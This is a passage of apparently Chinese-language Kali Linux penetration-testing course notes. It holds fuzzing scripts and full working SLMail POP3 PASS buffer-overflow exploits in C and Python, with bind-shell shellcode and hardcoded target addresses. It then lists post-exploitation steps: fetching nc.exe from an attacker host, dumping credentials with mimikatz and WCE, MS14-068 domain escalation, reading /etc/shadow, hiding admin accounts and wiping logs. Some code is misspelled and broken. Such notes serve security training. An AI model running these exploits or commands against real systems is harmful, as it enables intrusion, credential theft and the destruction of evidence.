scoket连接时存在缓冲区溢出漏洞</li></ul></li><li>调试工具<ul><li>edb</li></ul></li><li>运行平台<ul><li>Kali i486 虚拟机</li></ul></li></ul></li><li>2.Fuzzing<ul><li>新版本Linux内核会支持内存保护机制<ul><li>DEP</li><li>ASLR</li><li>堆栈 cookies</li><li>堆栈粉碎 </li></ul></li><li>本机调试<ul><li>ipatbles -A INPUT -p tcp –destination-port 4444 ! -d 127.0.0.1 -j DROP</li><li>ipatbles -A INPUT -p tcp –destination-port 13327 ! -d 127.0.0.1 -j DROP</li></ul></li><li>1.01.py<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">host=&quot;127.0.0.1&quot;</span><br><span class="line">#\x41 代表A 精确溢出</span><br><span class="line">crash=&quot;\x41&quot;*4379  </span><br><span class="line"># \x11 设备操作指令 \x90 NOP指令</span><br><span class="line">buffer=&quot;\x11(setup sound &quot;+ crash +&quot;\x90\x00#&quot;</span><br><span class="line"># 建立连接</span><br><span class="line">s=scoket.socket(socket_AF_INET,socket.SOCK_STREAM)</span><br><span class="line">print &quot;[*] Sending evil buffer...&quot;</span><br><span class="line">s.connect((host,13327))</span><br><span class="line">data=s.recv(1024)</span><br><span class="line">print data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*]Payload Sent!&quot;</span><br></pre></td></tr></table></figure></li></ul></li></ul></blockquote><ul><li><p>2.唯一字符串识别EIP精确位置 </p><ul><li>02.py<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">import socket</span><br><span class="line">host=&quot;127.0.0.1&quot;</span><br><span class="line">#\x41 代表A 精确溢出</span><br><span class="line">crash=&apos;A&apos;*4368+&apos;B&apos;*4+&apos;C&apos;*7 </span><br><span class="line"># \x11 设备操作指令 \x90 NOP指令</span><br><span class="line">buffer=&quot;\x11(setup sound &quot;+ crash +&quot;\x90\x00#&quot;</span><br><span class="line"># 建立连接</span><br><span class="line">s=scoket.socket(socket_AF_INET,socket.SOCK_STREAM)</span><br><span class="line">print &quot;[*] Sending evil buffer...&quot;</span><br><span class="line">s.connect((host,13327))</span><br><span class="line">data=s.recv(1024)</span><br><span class="line">print data</span><br><span class="line">s.send(buffer)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;[*]Payload Sent!&quot;</span><br></pre></td></tr></table></figure></li></ul></li><li><p>3.思路:shellcode代码置入</p><ul><li>第一阶段shellcode<ul><li>ESP 跳转到 EAX</li><li>偏移12个字节</li></ul></li><li>setup sound shellcode2</li><li>nasm <ul><li>add eax,12</li><li>jmp eax</li></ul></li></ul></li><li><ol start="4"><li>查找坏字符<ul><li>\x00\x0a\0x0d\x20</li></ul></li></ol></li><li><p>5.shellcode</p><ul><li>ESP跳转地址</li><li>跳转该过程: EIP-&gt;jmp esp-&gt;add  eax 12-&gt;jmp eax</li><li>使用msfpayload 生成shellcode<blockquote><p>选择和修改EXP</p></blockquote></li></ul></li><li><p>网上公开的EXP代码</p><ul><li>选择可信赖的EXP源(虚拟环境中验证)</li><li>Exploit-db</li><li>SecurityFocus(安全焦点)</li><li>Searchsploit</li></ul></li><li><p>有能力修改EXP(Python,Perl,Ruby,C,C++…)</p></li><li><p>选择和修改EXP</p><ul><li>646.C<ul><li>类unix环境下编译</li><li>返回地址与本机环境不符</li><li>反弹shell硬编码回连IP地址</li><li>缓冲区偏移量与环境不符</li><li>目标IP硬编码<figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">//646.c  SLMAIL REMOTE PASSWD BO 代码</span><br><span class="line">// 需使用gcc进行编译 </span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;winsock2.h&gt;</span><br><span class="line">#include &lt;windows.h&gt;</span><br></pre></td></tr></table></figure></li></ul></li></ul></li></ul><p>// [*] bind 4444<br>unsigned char shellcode[] =<br>“\xfc\x6a\xeb\x4d\xe8\xf9\xff\xff\xff\x60\x8b\x6c\x24\x24\x8b\x45”<br>“\x3c\x8b\x7c\x05\x78\x01\xef\x8b\x4f\x18\x8b\x5f\x20\x01\xeb\x49”<br>“\x8b\x34\x8b\x01\xee\x31\xc0\x99\xac\x84\xc0\x74\x07\xc1\xca\x0d”<br>“\x01\xc2\xeb\xf4\x3b\x54\x24\x28\x75\xe5\x8b\x5f\x24\x01\xeb\x66”<br>“\x8b\x0c\x4b\x8b\x5f\x1c\x01\xeb\x03\x2c\x8b\x89\x6c\x24\x1c\x61”<br>“\xc3\x31\xdb\x64\x8b\x43\x30\x8b\x40\x0c\x8b\x70\x1c\xad\x8b\x40”<br>“\x08\x5e\x68\x8e\x4e\x0e\xec\x50\xff\xd6\x66\x53\x66\x68\x33\x32”<br>“\x68\x77\x73\x32\x5f\x54\xff\xd0\x68\xcb\xed\xfc\x3b\x50\xff\xd6”<br>“\x5f\x89\xe5\x66\x81\xed\x08\x02\x55\x6a\x02\xff\xd0\x68\xd9\x09”<br>“\xf5\xad\x57\xff\xd6\x53\x53\x53\x53\x53\x43\x53\x43\x53\xff\xd0”<br>“\x66\x68\x11\x5c\x66\x53\x89\xe1\x95\x68\xa4\x1a\x70\xc7\x57\xff”<br>“\xd6\x6a\x10\x51\x55\xff\xd0\x68\xa4\xad\x2e\xe9\x57\xff\xd6\x53”<br>“\x55\xff\xd0\x68\xe5\x49\x86\x49\x57\xff\xd6\x50\x54\x54\x55\xff”<br>“\xd0\x93\x68\xe7\x79\xc6\x79\x57\xff\xd6\x55\xff\xd0\x66\x6a\x64”<br>“\x66\x68\x63\x6d\x89\xe5\x6a\x50\x59\x29\xcc\x89\xe7\x6a\x44\x89”<br>“\xe2\x31\xc0\xf3\xaa\xfe\x42\x2d\xfe\x42\x2c\x93\x8d\x7a\x38\xab”<br>“\xab\xab\x68\x72\xfe\xb3\x16\xff\x75\x44\xff\xd6\x5b\x57\x52\x51”<br>“\x51\x51\x6a\x01\x51\x51\x55\x51\xff\xd0\x68\xad\xd9\x05\xce\x53”<br>“\xff\xd6\x6a\xff\xff\x37\xff\xd0\x8b\x57\xfc\x83\xc4\x64\xff\xd6”<br>“\x52\xff\xd0\x68\xf0\x8a\x04\x5f\x53\xff\xd6\xff\xd0”;</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">```</span><br></pre></td></tr></table></figure><p>void exploit(int sock) {<br>      FILE <em>test;<br>      int *ptr;<br>      char userbuf[] = “USER madivan\r\n”;<br>      char evil[3001];<br>      char buf[3012];<br>      char receive[1024];<br>      char nopsled[] = “\x90\x90\x90\x90\x90\x90\x90\x90”<br>                       “\x90\x90\x90\x90\x90\x90\x90\x90”;<br>      memset(buf, 0x00, 3012);<br>      memset(evil, 0x00, 3001);<br>      memset(evil, 0x43, 3000);<br>      ptr = &evil;<br>      ptr = ptr + 652; // 2608<br>      memcpy(ptr, &amp;nopsled, 16);<br>      ptr = ptr + 4;<br>      memcpy(ptr, &amp;shellcode, 317);<br>      *(long</em>)&amp;evil[2600] = 0x7CB41010; // JMP ESP XP 7CB41020 FFE4 JMP ESP</p><pre><code>// bannerrecv(sock, receive, 200, 0);printf(&quot;[+] %s&quot;, receive);// userprintf(&quot;[+] Sending Username...\n&quot;);send(sock, userbuf, strlen(userbuf), 0);recv(sock, receive, 200, 0);printf(&quot;[+] %s&quot;, receive);// passwdprintf(&quot;[+] Sending Evil buffer...\n&quot;);sprintf(buf, &quot;PASS %s\r\n&quot;, evil);//test = fopen(&quot;test.txt&quot;, &quot;w&quot;);//fprintf(test, &quot;%s&quot;, buf);//fclose(test);send(sock, buf, strlen(buf), 0);printf(&quot;[*] Done! Connect to the host on port 4444...\n\n&quot;);</code></pre><p>}</p><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">```</span><br><span class="line">int connect_target(char *host, u_short port)</span><br><span class="line">&#123;</span><br><span class="line">    int sock = 0;</span><br><span class="line">    struct hostent *hp;</span><br><span class="line">    WSADATA wsa;</span><br><span class="line">    struct sockaddr_in sa;</span><br><span class="line"></span><br><span class="line">    WSAStartup(MAKEWORD(2,0), &amp;wsa);</span><br><span class="line">    memset(&amp;sa, 0, sizeof(sa));</span><br><span class="line"></span><br><span class="line">    hp = gethostbyname(host);</span><br><span class="line">    if (hp == NULL) &#123;</span><br><span class="line">        printf(&quot;gethostbyname() error!\n&quot;); exit(0);</span><br><span class="line">    &#125;</span><br><span class="line">    printf(&quot;[+] Connecting to %s\n&quot;, host);</span><br><span class="line">    sa.sin_family = AF_INET;</span><br><span class="line">    sa.sin_port = htons(port);</span><br><span class="line">    sa.sin_addr = **((struct in_addr **) hp-&gt;h_addr_list);</span><br><span class="line"></span><br><span class="line">    sock = socket(AF_INET, SOCK_STREAM, 0);</span><br><span class="line">    if (sock &lt; 0)      &#123;</span><br><span class="line">        printf(&quot;[-] socket blah?\n&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">        &#125;</span><br><span class="line">    if (connect(sock, (struct sockaddr *) &amp;sa, sizeof(sa)) &lt; 0)</span><br><span class="line">        &#123;printf(&quot;[-] connect() blah!\n&quot;);</span><br><span class="line">        exit(0);</span><br><span class="line">          &#125;</span><br><span class="line">    printf(&quot;[+] Connected to %s\n&quot;, host);</span><br><span class="line">    return sock;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char **argv)</span><br><span class="line">&#123;</span><br><span class="line">    int sock = 0;</span><br><span class="line">    int data, port;</span><br><span class="line">    printf(&quot;\n[$] SLMail Server POP3 PASSWD Buffer Overflow exploit\n&quot;);</span><br><span class="line">    printf(&quot;[$] by Mad Ivan [ void31337 team ] - http://exploit.void31337.ru\n\n&quot;);</span><br><span class="line">    if ( argc &lt; 2 ) &#123; printf(&quot;usage: slmail-ex.exe &lt;host&gt; \n\n&quot;); exit(0); &#125;</span><br><span class="line">    port = 110;</span><br><span class="line">    sock = connect_target(argv[1], port);</span><br><span class="line">    exploit(sock);</span><br><span class="line">    closesocket(sock);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plain hljs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"># 638.py POP3 PASS 缓冲区溢出代码</span><br><span class="line">import struct</span><br><span class="line">import socket</span><br><span class="line"></span><br><span class="line">print &quot;\n\n###############################################&quot;</span><br><span class="line">print &quot;\nSLmail 5.5 POP3 PASS Buffer Overflow&quot;</span><br><span class="line">print &quot;\nFound &amp; coded by muts [at] offsec.com&quot;</span><br><span class="line">print &quot;\nFor Educational Purposes Only!&quot; </span><br><span class="line">print &quot;\n\n###############################################&quot;</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sc = &quot;\xd9\xee\xd9\x74\x24\xf4\x5b\x31\xc9\xb1\x5e\x81\x73\x17\xe0\x66&quot;</span><br><span class="line">sc += &quot;\x1c\xc2\x83\xeb\xfc\xe2\xf4\x1c\x8e\x4a\xc2\xe0\x66\x4f\x97\xb6&quot;</span><br><span class="line">sc += &quot;\x31\x97\xae\xc4\x7e\x97\x87\xdc\xed\x48\xc7\x98\x67\xf6\x49\xaa&quot;</span><br><span class="line">sc += &quot;\x7e\x97\x98\xc0\x67\xf7\x21\xd2\x2f\x97\xf6\x6b\x67\xf2\xf3\x1f&quot;</span><br><span class="line">sc += &quot;\x9a\x2d\x02\x4c\x5e\xfc\xb6\xe7\xa7\xd3\xcf\xe1\xa1\xf7\x30\xdb&quot;</span><br><span class="line">sc += &quot;\x1a\x38\xd6\x95\x87\x97\x98\xc4\x67\xf7\xa4\x6b\x6a\x57\x49\xba&quot;</span><br><span class="line">sc += &quot;\x7a\x1d\x29\x6b\x62\x97\xc3\x08\x8d\x1e\xf3\x20\x39\x42\x9f\xbb&quot;</span><br><span class="line">sc += &quot;\xa4\x14\xc2\xbe\x0c\x2c\x9b\x84\xed\x05\x49\xbb\x6a\x97\x99\xfc&quot;</span><br><span class="line">sc += &quot;\xed\x07\x49\xbb\x6e\x4f\xaa\x6e\x28\x12\x2e\x1f\xb0\x95\x05\x61&quot;</span><br><span class="line">sc += &quot;\x8a\x1c\xc3\xe0\x66\x4b\x94\xb3\xef\xf9\x2a\xc7\x66\x1c\xc2\x70&quot;</span><br><span class="line">sc += &quot;\x67\x1c\xc2\x56\x7f\x04\x25\x44\x7f\x6c\x2b\x05\x2f\x9a\x8b\x44&quot;</span><br><span class="line">sc += &quot;\x7c\x6c\x05\x44\xcb\x32\x2b\x39\x6f\xe9\x6f\x2b\x8b\xe0\xf9\xb7&quot;</span><br><span class="line">sc += &quot;\x35\x2e\x9d\xd3\x54\x1c\x99\x6d\x2d\x3c\x93\x1f\xb1\x95\x1d\x69&quot;</span><br><span class="line">sc += &quot;\xa5\x91\xb7\xf4\x0c\x1b\x9b\xb1\x35\xe3\xf6\x6f\x99\x49\xc6\xb9&quot;</span><br><span class="line">sc += &quot;\xef\x18\x4c\x02\x94\x37\xe5\xb4\x99\x2b\x3d\xb5\x56\x2d\x02\xb0&quot;</span><br><span class="line">sc += &quot;\x36\x4c\x92\xa0\x36\x5c\x92\x1f\x33\x30\x4b\x27\x57\xc7\x91\xb3&quot;</span><br><span class="line">sc += &quot;\x0e\x1e\xc2\xf1\x3a\x95\x22\x8a\x76\x4c\x95\x1f\x33\x38\x91\xb7&quot;</span><br><span class="line">sc += &quot;\x99\x49\xea\xb3\x32\x4b\x3d\xb5\x46\x95\x05\x88\x25\x51\x86\xe0&quot;</span><br><span class="line">sc += &quot;\xef\xff\x45\x1a\x57\xdc\x4f\x9c\x42\xb0\xa8\xf5\x3f\xef\x69\x67&quot;</span><br><span class="line">sc += &quot;\x9c\x9f\x2e\xb4\xa0\x58\xe6\xf0\x22\x7a\x05\xa4\x42\x20\xc3\xe1&quot;</span><br><span class="line">sc += &quot;\xef\x60\xe6\xa8\xef\x60\xe6\xac\xef\x60\xe6\xb0\xeb\x58\xe6\xf0&quot;</span><br><span class="line">sc += &quot;\x32\x4c\x93\xb1\x37\x5d\x93\xa9\x37\x4d\x91\xb1\x99\x69\xc2\x88&quot;</span><br><span class="line">sc += &quot;\x14\xe2\x71\xf6\x99\x49\xc6\x1f\xb6\x95\x24\x1f\x13\x1c\xaa\x4d&quot;</span><br><span class="line">sc += &quot;\xbf\x19\x0c\x1f\x33\x18\x4b\x23\x0c\xe3\x3d\xd6\x99\xcf\x3d\x95&quot;</span><br><span class="line">sc += &quot;\x66\x74\x32\x6a\x62\x43\x3d\xb5\x62\x2d\x19\xb3\x99\xcc\xc2&quot;</span><br><span class="line"></span><br><span class="line">#Tested on Win2k SP4 Unpatched</span><br><span class="line"># Change ret address if needed</span><br><span class="line">buffer = &apos;\x41&apos; * 4654 + struct.pack(&apos;&lt;L&apos;, 0x783d6ddf) + &apos;\x90&apos;*32 + sc </span><br><span class="line">try:</span><br><span class="line">print &quot;\nSending evil buffer...&quot;</span><br><span class="line">s.connect((&apos;192.168.1.167&apos;,110))</span><br><span class="line">data = s.recv(1024)</span><br><span class="line">s.send(&apos;USER username&apos; +&apos;\r\n&apos;)</span><br><span class="line">data = s.recv(1024)</span><br><span class="line">s.send(&apos;PASS &apos; + buffer + &apos;\r\n&apos;)</span><br><span class="line">data = s.recv(1024)</span><br><span class="line">s.close()</span><br><span class="line">print &quot;\nDone! Try connecting to port 4444 on victim machine.&quot;</span><br><span class="line">except:</span><br><span class="line">print &quot;Could not connect to POP3!&quot;</span><br></pre></td></tr></table></figure><blockquote><p>避免有害的EXP</p><ul><li>不同的EXP<ul><li>不同的系统补丁</li><li>软件版本</li><li>不同的offset,shellcode</li></ul></li><li>扫描探测目标系统版本,搭建适当的测试环境<ul><li>避免一锤子测试</li></ul></li><li>修改公开的EXP满足不同的环境需要<ul><li>了解漏洞原理,修改溢出代码<br>后漏洞利用阶段(POST EXPLOITATION)</li></ul></li></ul></blockquote><ul><li><p>1.漏洞利用后阶段</p><ul><li><p>上传工具</p></li><li><p>提取</p></li><li><p>擦除攻击痕迹</p></li><li><p>安装后门(木马程序)</p><ul><li>长期控制</li><li>Dump密码</li><li>内网渗透(拿到更多服务器)</li></ul></li><li><p>后漏洞利用阶段</p><ul><li>最大的挑战-防病毒软件</li><li>使用合法的远程控制软件(nc)</li></ul></li><li><p>2.上传工具之上传文件</p><ul><li>持久控制<ul><li>扩大对目标系统的控制能力</li><li>Linux系统<ul><li>netcat</li><li>curl</li><li>wget</li></ul></li><li>windos系统<ul><li>缺少预装的下载工具</li><li>一些问题解决方案:<ul><li>a.非交互式模式shell(具有局限性,需上传木马拿到交互式shell)<ul><li>类nc 远程控制shell</li><li>ftp 192.168.1.1 </li></ul></li></ul></li></ul></li><li>上传文件的方法<ul><li>使用TFTP传输文件<ul><li>xp,2003默认安装</li><li>win7,2008需要单独添加</li><li>经常被边界防火墙过滤</li></ul></li><li>使用FTP传输文件<ul><li>apt-get install pure-ftpd</li><li>ftp.sh</li></ul></li><li>使用 VBSCRIPT 传输文件<ul><li>wget.vbs</li><li>cscript wget.vbs.<a href="http://192.168.1.117/nc.exe" target="_blank" rel="noopener">http://192.168.1.117/nc.exe</a> nc.exe</li></ul></li><li>使用POWERSHELL 传输文件<ul><li>Wget.ps1</li></ul></li><li>使用DEBUG 传输文件<ul><li>Debug<ul><li>汇编,反汇编</li><li>16进制dump工具</li><li>64k字节</li></ul></li><li>upx压缩文件</li><li>wine exe2bat.exe nc.exe nx.hex</li><li>debug&lt;nc.hex</li><li>copy 1.dll nc.exe</li></ul></li></ul></li></ul></li></ul></li></ul></li></ul><h2 id="Kali-Linux-从入门到精通-十一-–提权"><a href="#Kali-Linux-从入门到精通-十一-–提权" class="headerlink" title="Kali Linux 从入门到精通(十一)–提权"></a>Kali Linux 从入门到精通(十一)–提权</h2><blockquote><p>本地提权</p><ul><li>已实现本地低权限账号登录<ul><li>远程溢出</li><li>直接获得账号密码</li></ul></li><li>希望获取更高权限<ul><li>实现对目标进一步控制</li></ul></li><li>系统之间权限隔离<ul><li>操作系统安全的基础</li><li>用户空间</li><li>内核空间</li></ul></li><li>系统账号<ul><li>用户账号登陆时获取权限令牌</li><li>服务账号无需用户登陆已在后台启动服务</li></ul></li><li>Windows<ul><li>user</li><li>Administrator</li><li>System:实质最大权限账号</li><li>注:非包含关系,交集</li></ul></li><li>Linux<ul><li>User</li><li>Root:相当于Administrator和System<br>Windows 系统提权之—-ADMIN–提取为SYSTEM</li></ul></li><li>Windos账号 <ul><li>系统设置管理功能</li><li>Sysinternal Suit<ul><li><a href="https://technet.microsoft.com/en-us/sysinternals" target="_blank" rel="noopener">https://technet.microsoft.com/en-us/sysinternals</a></li><li>psexec -i -s -d taskmgr</li></ul></li><li>at 19:39 /interactive cmd</li><li>sc Create syscmd binPath=”cmd /K start” type=own type=”interact”</li><li>sc start syscmd(系统默认以SYSTEM方式启动服务)</li></ul></li><li>注入进程提权<ul><li>隐藏痕迹</li><li>pinjector.exe<ul><li><a href="http://www.tarasco.org/security/Process_injector/" target="_blank" rel="noopener">http://www.tarasco.org/security/Process_injector/</a><br>抓包嗅探</li><li>Windows</li><li>Wireshark</li><li>Omnipeek:Windows抓包工具,界面友好</li><li>commview</li><li>Sniffpass (基于抓包密码抓取数据)</li><li>Linux</li><li>Tcpdump</li><li>Wireshark</li><li>Dsniff   (抓取密码)<br>键盘登录</li><li>Keylogger</li><li>木马窃取<br>本地缓存密码</li><li>浏览器缓存的密码</li><li>IE浏览器</li><li>Firefox</li><li>网络密码</li><li>无线密码</li><li><a href="http://www.nirsoft.net" target="_blank" rel="noopener">http://www.nirsoft.net</a></li></ul></li></ul></li></ul></blockquote><ul><li>Dump SAM(数据库)<ul><li>Pwdump(从windows的SAM中读取密文)</li><li>/usr/share/windows-binaried/fgdump/<ul><li>生成PWDUMP 文件</li><li>使用ophcrack(密码破解工具) 进行爆破<blockquote><p>Windows 身份认证过程<br><img src="https://s2.ax1x.com/2020/03/01/3cmbG9.png" alt="3cmbG9.png"><br><img src="https://s2.ax1x.com/2020/03/01/3cmHPJ.png" alt="3cmHPJ.png"><br><img src="https://s2.ax1x.com/2020/03/01/3cmT54.png" alt="3cmT54.png"><br>WCE(WINDOWS CREDENTIAL EDITOR)&lt;======工具(win7之前)</p></blockquote></li></ul></li></ul></li><li>/usr/share/wce/</li><li>需要管理员权限</li><li>wce-universal.exe -l / -lv</li><li>wce-universal.exe -d</li><li>wce-universal.exe -e / -r</li><li>wce-universal.exe -g</li><li>wce-universal.exe -w</li><li>LM/NT bash</li><li>从内存读取LM/NLTM hash</li><li>Digest AAUTHENTICATION Package</li><li>NLTM Security Package</li><li>Kerberos Security Package</li><li>防止WCE攻击<blockquote><p>其他工具</p><ul><li>pwdump localhost</li><li>fgdump</li><li>mimikatz<ul><li>privilege::debug # 提升权限</li><li>sekulsa::logonPasswords<br>利用漏洞提权</li></ul></li></ul></blockquote></li><li>MS 11-80 漏洞  ( 单机漏洞提取)<ul><li>Ms 11-080 (11 年第80个漏洞)—&gt; 中文版本会产生dos(拒绝服务攻击)</li><li>Kb2592799<ul><li><a href="https://technet.microsoft.com/library/security/ms11-080" target="_blank" rel="noopener">https://technet.microsoft.com/library/security/ms11-080</a></li></ul></li><li>Pyinstaller</li><li>Pywin32</li><li>MS11-046<ul><li>DoS</li></ul></li></ul></li><li>MS14-068 漏洞  (获得域的管理员权限 操控多台计算机)<ul><li>库<ul><li><a href="http://github.com/bidord/pykel" target="_blank" rel="noopener">http://github.com/bidord/pykel</a></li></ul></li><li>ms14-068.py -u <a href="mailto:user@lab.com" target="_blank" rel="noopener">user@lab.com</a> -s userSID -d dc.lab.com</li><li>拷贝 TGT_user1@ lab.com cache到windos系统</li><li>本地管理员登录<ul><li>mimkatz.exe </li></ul></li></ul></li><li>CVE-2012-0056 (Linux OS 漏洞)<ul><li>/proc/pid/mem  (进程权限控制不严格)</li><li>kernels&gt;2.6.39</li><li><a href="http://blog.zx2c4.com/749" target="_blank" rel="noopener">http://blog.zx2c4.com/749</a><blockquote><p>利用配置不当提权</p><ul><li>与漏洞提取相比 更常用的方法</li><li>企业环境</li><li>补丁更新的全部已经安装</li><li>输入变量过滤之外更值得研发关注的安全隐患</li><li>以system的权限启动</li><li>NTFS权限允许users修改删除</li><li>icals</li><li>icals c:\windows*.exe /save perm /T</li><li>Find</li><li>find / -perm 777 -execls -l {} ; </li><li>应用系统的配置文件</li><li>应用连接数据库的配置文件</li><li>后台服务运行账号<br>基本信息收集</li><li>Linux</li></ul></blockquote></li><li>/etc/resolv.conf</li><li>/etc/passwd</li><li>/etc/shadow   (保存有密码)</li><li>whoami,who -a</li><li>ifconfig -a iptables -L -n,netstat -rn</li><li>uname -a,ps aux</li><li>dpkg -l | head<ul><li>Windows</li></ul></li><li>ipconfig / all, ipconfig/displaydns netstat -bnao,netstat -r</li><li>net view,netview /domain</li><li>net user/domain </li><li>net accounts,net share</li><li>net localgroup administarators username /add</li><li>net group “Domain Controlleds” /domain<blockquote><p>WMIC(WINDOWS MANAGEMENT INSTRUMENTATION)&lt;—强大功能</p><ul><li>wmic nicconfig get ipaddress,nacadess</li><li>wmic computersystem get username<br>收集敏感信息</li><li>商业信息</li><li>系统信息</li><li>Linux</li><li>/etc ; /usr/local/etc</li><li>/etc/pass ; /etc/shadow</li><li>.ssh ; .gnupg 公私钥</li><li>The e-mail and data file</li><li>业务数据库 ; 身份认证服务器数据库</li><li>/tmp</li><li>Windows</li><li>SAM 数据库 ; 注册表文件</li><li>%SYSTEMROOT%\repair\SAM  (存放SAM副本)</li><li>%SYSTEMROOTS%\System32\config\RegBack\SAM  (存放SAM副本)</li><li>业务数据库 ; 身份认证数据库</li><li>临时文件目录<br>隐藏痕迹</li><li>禁止在登录界面显示新建账号</li><li>REG ADD “HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windoes NT\CurrentVersion\WinLogon\SpecialAccounts\UserList” /v uname /T<br>REG_SWORD/D 0   (隐藏账号)</li><li>del %WINDIR%*.log /a/s/q/f</li><li>History</li><li>日志</li></ul></blockquote></li><li>auth.log / secure</li><li>btmp / wtmp</li><li>lastlog / faillog<ul><li>其他日志和HIDS等</li></ul></li></ul></li></ul><h2 id="Kali-Linux-从入门到精通-十一-–无线渗透测试"><a href="#Kali-Linux-从入门到精通-十一-–无线渗透测试" class="headerlink" title="Kali Linux 从入门到精通(十一)–无线渗透测试"></a>Kali Linux 从入门到精通(十一)–无线渗透测试</h2><blockquote><p>1.无线渗透概述</p><ul><li>与其他章节独立,涵盖面广,可独立成课</li><li>无线技术变化块,难度大</li><li>既新鲜刺激 难度大<ul><li>不会研究很深</li></ul></li><li>半理论,半实践<ul><li>理论是本章最有价值的部分(aircrack-ng suite 作者写的一本书)</li></ul></li><li>无线技术是本课程难度最大的一章<ul><li>协议结构<br>2.无线技术特点</li></ul></li><li>行业迅猛发展</li><li>互联网的重要入口</li><li>边界模糊</li><li>安全实施缺失而且困难</li><li>对技术不了解而造成配置不当</li><li>企业网络私自接入AP破坏网络边界<br>3.IEEE:Institute of Elecrical and Electronics Engineers</li><li>IEEE分为不同的技术委员会,其中802委员会负责lan,man的制定<ul><li>以太网</li><li>令牌环网</li><li>无线局域网</li><li>网桥<br>4.无线(802.11)</li></ul></li><li>数据链路层<ul><li>LLC</li><li>MAC</li></ul></li><li>物理层</li><li>IEEE 802.11 标准<br>图片1<br>图片4<br>802.11b<br>802.11A<br>802.11G</li><li>无线<br>图片2</li><li>日常使用<br>图片3<br>5.无线网络运行模式</li><li>无线网络架构 (两种半方式)</li><li>a. Infrasture (基础架构型)<ul><li>AP 维护SSID(服务级标识符–即无线名)</li><li>至少包含一个AP和一个STATION,形成一个Basic Service Set(BSS) 基本服务集</li><li>AP连接到有线网络,称为Distribution System(DS)</li><li>连接到同一个DS的多个AP形成一个Extended Service Set(ESS)</li></ul></li><li>b. Ad-Hoc<ul><li>STA 维护SSID</li><li>也被称为Independent Basic Service Set(IBSS)</li><li>有至少两个STAs直接通信组成</li><li>也称为peer to peer模式</li><li>其中一个STA负责AP的工作<ul><li>通过beacon广播SSID</li><li>对其他STAs进行直接身份验证</li></ul></li></ul></li><li>Service Set Identifier(SSID)<pre><code>- AP每秒钟约10次通过Beacon帧广播SSID- 客户端连接到无线网络后也会宣告SSID  